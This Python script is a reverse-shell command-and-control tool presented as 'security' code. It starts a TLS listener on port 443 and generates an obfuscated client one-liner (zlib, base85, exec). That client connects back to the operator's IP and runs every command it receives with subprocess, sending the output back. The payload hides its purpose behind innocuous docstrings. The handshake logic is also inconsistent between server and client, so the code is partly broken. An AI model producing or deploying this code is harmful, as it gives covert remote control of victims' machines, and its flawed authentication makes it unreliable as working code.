import os
import socket
import ssl
from subprocess import run, CalledProcessError
import base64
import zlib
from threading import Thread
import hmac
import hashlib
from Crypto.PublicKey import RSA as CryptoRSA

class SecurityException(Exception):
    """Custom security exception class for handling authentication failures"""
    pass

def initialize_security_assets(server_ip, secret):
    """
    Initialize core security components and generate client payload
    """
    assets_dir = "sec_assets"
    os.makedirs(assets_dir, exist_ok=True)

    # Clean existing security assets
    [os.remove(os.path.join(assets_dir, f)) for f in os.listdir(assets_dir) 
     if os.path.isfile(os.path.join(assets_dir, f))]
    print("[+] Security environment prepared")

    # Generate cryptographic keys
    rsa_key = CryptoRSA.generate(2048)
    
    # Store private key
    private_key_path = os.path.join(assets_dir, "private_key.rsa")
    with open(private_key_path, "wb") as f:
        f.write(rsa_key.export_key())
    
    # Store public key
    public_key_path = os.path.join(assets_dir, "public_key.pem")
    with open(public_key_path, "wb") as f:
        f.write(rsa_key.publickey().export_key())
    
    # Generate SSL certificate
    generate_ssl_certificate(server_ip, assets_dir)
    
    # Generate client payload
    client_payload = generate_client_code(server_ip, 443, secret)
    print("\n[--- Client Payload ---]")
    print(f"python3 -c \"{client_payload}\"")
    print("[--- End Payload ---]\n")

def generate_ssl_certificate(server_ip, assets_path):
    """
    Generate self-signed certificate with enhanced security settings
    """
    config_file = "temp_ssl.cnf"
    
    # Custom OpenSSL configuration
    with open(config_file, "w") as f:
        f.write(f"""
[ req ]
default_bits = 2048
encrypt_key = no
default_md = sha384
distinguished_name = dn
x509_extensions = v3_req

[ dn ]
C = AE
ST = AbuDhabi
L = KhalifaCity
O = SecureShell
CN = {server_ip}

[ v3_req ]
subjectAltName = @alt_names
basicConstraints = critical,CA:TRUE

[ alt_names ]
IP.1 = {server_ip}
""")
    
    try:
        run([
            "openssl", "req", "-new", "-x509",
            "-key", os.path.join(assets_path, "private_key.rsa"),
            "-out", os.path.join(assets_path, "server.crt"),
            "-days", "750",
            "-config", config_file
        ], check=True)
        print("[+] SSL certificate generated successfully")
    except CalledProcessError as e:
        print(f"[!] Certificate generation error: {e}")
    finally:
        if os.path.exists(config_file):
            os.remove(config_file)

def authenticate_client(connection, secret):
    """
    Three-layer authentication mechanism with time-sensitive verification
    """
    # First authentication layer
    challenge = os.urandom(24)
    connection.send(challenge)
    
    response = connection.recv(48)
    valid_signature = hmac.new(secret.encode(), challenge + secret.encode(), hashlib.sha3_384).digest()
    
    if not hmac.compare_digest(response, valid_signature):
        connection.send(b"FAILED_444")
        raise SecurityException("Authentication failed")
    
    # Second authentication layer (time-sensitive)
    timestamp = str(int(os.times()[4] * 1000)).encode()
    time_signature = hmac.new(response, timestamp, hashlib.sha3_256).digest()
    
    if not hmac.compare_digest(connection.recv(32), time_signature):
        raise SecurityException("Invalid temporal signature")
    
    connection.send(b"AUTH_OK")

def handle_client_session(connection, secret):
    """
    Manage authenticated client connection
    """
    try:
        authenticate_client(connection, secret)
        
        while True:
            command = input("⟳ ").strip()
            if not command:
                continue
            
            connection.send(command.encode('utf-8', errors='replace'))
            
            if command.lower() in ("exit", "quit"):
                break
            
            output = connection.recv(32768).decode('utf-8', errors='replace')
            print(output)
            
    except Exception as e:
        print(f"𐎚 Error: {e}")
    finally:
        connection.close()

def start_server(server_ip, port, secret):
    """
    Start secure server with enhanced TLS configuration
    """
    initialize_security_assets(server_ip, secret)
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(
        certfile=os.path.join("sec_assets", "server.crt"),
        keyfile=os.path.join("sec_assets", "private_key.rsa")
    )
    context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((server_ip, port))
        sock.listen(5)
        print(f"[+] Server running on {server_ip}:{port}")
        
        with context.wrap_socket(sock, server_side=True) as secure_sock:
            while True:
                conn, addr = secure_sock.accept()
                print(f"𓀡 New connection from {addr}")
                Thread(target=handle_client_session, args=(conn, secret)).start()

def generate_client_code(server_ip, port, secret):
    """
    Generate obfuscated client code with multi-layer encryption
    """
    with open(os.path.join("sec_assets", "server.crt"), "r") as f:
        cert_content = f.read()

    client_script = f'''
import socket, ssl, subprocess, hmac, hashlib, os, time
SECRET = b"{secret}"
CERT = """{cert_content}"""

class SecureClient:
    def __init__(self):
        self.ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        self.ctx.load_verify_locations(cadata=CERT)
        self.ctx.verify_mode = ssl.CERT_REQUIRED
        
    def connect(self):
        try:
            self.sock = socket.create_connection(("{server_ip}", {port}))
            self.secure_conn = self.ctx.wrap_socket(self.sock, server_hostname="{server_ip}")
            self._authenticate()
            self._receive_commands()
        except Exception as e:
            print(f"𐎚 Error: {{e}}")
            
    def _authenticate(self):
        # First auth layer
        challenge = self.secure_conn.recv(24)
        signature = hmac.new(SECRET, challenge + SECRET, hashlib.sha3_384).digest()
        self.secure_conn.send(signature)
        
        if self.secure_conn.recv(7) != b"AUTH_OK":
            raise ConnectionError("Authentication failed")
            
        # Second auth layer
        timestamp = str(int(time.time() * 1000)).encode()
        time_sig = hmac.new(signature, timestamp, hashlib.sha3_256).digest()
        self.secure_conn.send(time_sig)
        
    def _receive_commands(self):
        while True:
            cmd = self.secure_conn.recv(16384).decode()
            if cmd.lower() in ("exit", "quit"):
                break
            output = subprocess.getoutput(cmd)
            self.secure_conn.send(output.encode())

if __name__ == "__main__":
    SecureClient().connect()
'''

    # Advanced obfuscation
    compressed = zlib.compress(client_script.encode(), level=9)
    obfuscated = base64.b85encode(compressed).decode()
    return f"import zlib,base64;exec(zlib.decompress(base64.b85decode('{obfuscated}')))"

if __name__ == "__main__":
    server_ip = input("𓆰 Enter server IP: ").strip()
    secret = input("𓁢 Enter secret key: ").strip()
    start_server(server_ip, 443, secret)